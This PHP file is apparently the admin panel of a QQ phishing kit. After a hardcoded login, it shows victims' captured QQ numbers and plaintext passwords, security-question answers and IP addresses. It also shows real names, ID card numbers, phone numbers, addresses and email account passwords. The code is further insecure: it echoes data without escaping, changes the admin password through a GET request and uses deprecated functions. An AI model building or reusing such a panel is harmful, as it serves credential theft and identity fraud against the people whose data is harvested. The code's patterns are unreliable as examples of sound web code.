<?php
	require('function.php');
	session_start();
?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf8">
	<title>管理后台</title>
	<link rel="stylesheet" type="text/css" href="style/style.css">
	<script type="text/javascript" src="http://ajax.microsoft.com/ajax/jquery/jquery-1.4.min.js"></script>
</head>
<body>
	<?php

		if(!isset($_SESSION['admin'])){
			if(isset($_POST['login'])){
				if(empty($_POST['username']) || empty($_POST['password'])){
					echo '<script>alert("用户名或密码不能为空");</script>';
				}else{
					$pw=getAdminPassword();
					$pw=json_decode($pw);
					if($_POST['username']=='rot' && $_POST['password']==$pw){
						$_SESSION['admin']='true';
						echo '<script>alert("登录成功");window.location.href="fuckshit.php";</script>';
					}else{
						echo '<script>alert("用户名或密码错误");window.location.href="fuckshit.php";</script>';
					}
				}
			}
		?>
			<div class="login-panel"></div>
			<div style="top:0" class="login-box">
				<div class="login_box_title">
					<h1><strong>Admin</strong></h1>
				</div>
				<div class="login_box_content">
					<ul>
						<li>
							<div class="login_box_register">登录</div>
							<div class="login_box_input">
								<form action="fuckshit.php" method="post">
									<input class="the_input light_blue" name="username" placeholder="请输入邮箱" style="width:92%" type="text">
									<input class="the_input light_blue" name="password" placeholder="请输入密码" style="width:92%" type="password">
									<div style="margin-top:-8px;margin-bottom:6px;"></div>
									<input class="the_btn light_blue white blue_border" name="login" value="登录" type="submit">
								</form>
							</div>
						</li>
					</ul>
				</div>
			</div>
		<?php
		}else{

			if(isset($_GET['password'])){
				if(empty($_GET['password'])){
					echo '<script>alert("新密码不能为空");</script>';
				}else{
					setAdminPassword($_GET['password']);
					echo '<script>alert("设置成功");window.location.href="fuckshit.php";</script>';				
				}
			}

			if(isset($_GET['email'])){
				if(empty($_GET['email'])){
					echo '<script>alert("接收邮箱不能为空");</script>';
				}else{
					if(!eregi("\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*",$_GET['email'])){
						echo '<script>alert("邮箱格式不正确");window.location.href="fuckshit.php";</script>';
					}
					setMail($_GET['email']);
					echo '<script>alert("设置成功");window.location.href="fuckshit.php";</script>';
				}
			}

			if(isset($_GET['logout'])){
				session_unset();
				session_destroy();
				echo '<script>alert("退出成功");window.location.href="fuckshit.php";</script>';
			}
	?>
		<div>
			<div class="alter-info">
				<form style="margin:0 auto;width:800px;margin-bottom:10px;text-align:center" method="get" action="fuckshit.php">
					<input name="password" type="password">
					<input type="submit" value="修改密码">
				</form>
				<form style="margin:0 auto;text-align:center" method="get" action="fuckshit.php">
					<input name="email" type="email">
					<input type="submit" value="修改邮箱">
				</form>
				<form method="get" style="text-align:center;margin-top:10px;" action="fuckshit.php">
					<input type="submit" name="logout" value="退出">
				</form>
				<input type="button" value="返回主页" onclick="backToHome()">
				<!-- <input type="button" value="删除全部" onclick=""> -->
				<!-- <input type="button" value="批量删除" onclick=""> -->
			</div>
			<table class="altrowstable" style="margin-top:10px;" id="alternatecolor">
				<tr>
					<th>QQ</th>
					<th>密码</th>
					<th>时间</th>
					<th>密保</th>
					<th>资料</th>
					<th>IP</th>
					<th>操作</th>
				</tr>

				<?php
					$qqlist=getAllQQ();
					$qqlist=json_decode($qqlist);
					$securityList=json_decode(getSecurity());
					// $detailList=json_decode(getDetail());
					$content='';
					$detailInfo='';

					function formatDetail($detail,$qq){
						$detailList=$detail[0]['detail'];
    					$html="<table style=\"width:100%;\">";
						foreach ($detailList as $key => $value) {
							foreach ($value as $key1 => $value1) {
								if($key1==='真实姓名'){
									$index=$key+1;
									$html.="<td ref=\"$index-$qq\" class=\"detail_list_title\" style=\"cursor:pointer\"><strong>历史记录$index</strong></td>";
								}
								$html.="<tr class=\"detail-list detail-$key1-$index-$qq\"><td>$key1:<strong>".$value1."</strong></td></td>";
								$html.="</tr>";
							}
						}
						$html.="</table>";
						return $html;
					}

					function formatSecurity($content,$qq){
						$a=explode("+====+",$content);
						$html="<table style=\"width: 100%;\">";
						foreach ($a as $key => $security) {
							if($security!=null){
								$singleSecurity=explode(";", $security);
								$html.="<tr>";
								foreach ($singleSecurity as $key1 => $value) {
									if($value!=null){
										if($key1===0){
											$html.="<td ref=\"$key-$qq\" class=\"security_list_title\"><strong>历史记录$key</strong></td>";
										}
										$mi=explode("？:", $value);
										$quora=$mi[0];
										$answer=$mi[1];
										$html.="<tr class=\"security-list securtiy-$key-$qq-$key1\"><td>$quora?:<strong>$answer</strong></td>";
										$html.="</tr>";
									}
								}
								$html.="</tr>";					
							}
						}
						$html.="</table>";
						return $html;
					}

					if(!is_array($qqlist)){

					}else{
						foreach ($qqlist as $key => $value) {
							if(is_array($value)){
								foreach ($value as $k1 => $v2) {
									if($v2->qq==$securityList[$key]->qq){
										$content=$securityList[$key]->content;
									}
									$html=" <tr>
												<td>".$v2->qq."</td>
												<td>".$v2->password."</td>
												<td>".$v2->time."</td>
												<td>".$content."</td>
											</tr>";
									echo $html;
								}
							}else{
								if($value->qq==$securityList[$key]->qq){
									$content=$securityList[$key]->content;
								}
								$html=" <tr>
											<td>".$value->qq."</td>
											<td>".$value->password."</td>
											<td>".$value->time."</td>
											<td>".print_r(formatSecurity($content,$value->qq),true)."</td>
											<td>".print_r(formatDetail(json_decode(getDetail($value->qq),true),$value->qq),true)."</td>
											<td>".$value->IP."</td>
											<td><input qq=\"".$value->qq."\" type=\"button\" onclick=\"deleteQQ(this)\" value=\"删除\"></td>
										</tr>";
								echo $html;
							}
						}
					}			
				?>
			</table>
		</div>

	<?php
		}
	?>

	<script type="text/javascript">
		function backToHome(){
			window.location.href="index.php";
		}

		function deleteQQ(obj){
			var qq=$(obj).attr('qq');
			$.get("deleteQQ.php?qq="+qq,function(data,status){
    			if(data=='成功'){
    				$(obj).parent().parent().slideUp();
    			}else{
    				alert('删除失败');
    			}
  			});
		}

		$(document).ready(function(){
			$('body').css('background','rgb(255,255,255)');

			$('.detail-list,.security-list').slideUp();

			$('.detail_list_title').click(function(){
				var ref=$(this).attr('ref');
				var attrList=['真实姓名','详细地址','另一个QQ','密码','结果接收方式','接收结果的邮箱','接收结果的邮箱密码','历史密码1','历史密码2','历史密码3','真实姓名2','身份证类型','身份证号码','手机号码','备注'];
				for (var i = 0; i < attrList.length; i++) {
					var selector=".detail-"+attrList[i]+'-'+ref;
					$(selector).slideToggle();
				};
				$(this).toggleClass('admin_title_active');
			});

			$('.security_list_title').click(function(){
				var ref=$(this).attr('ref');
				for (var i = 0; i < 2; i++) {
					$('.securtiy-'+ref+"-"+i).slideToggle();
				};
				$(this).toggleClass('admin_title_active');
			});
		});
	</script>
</body>
</html>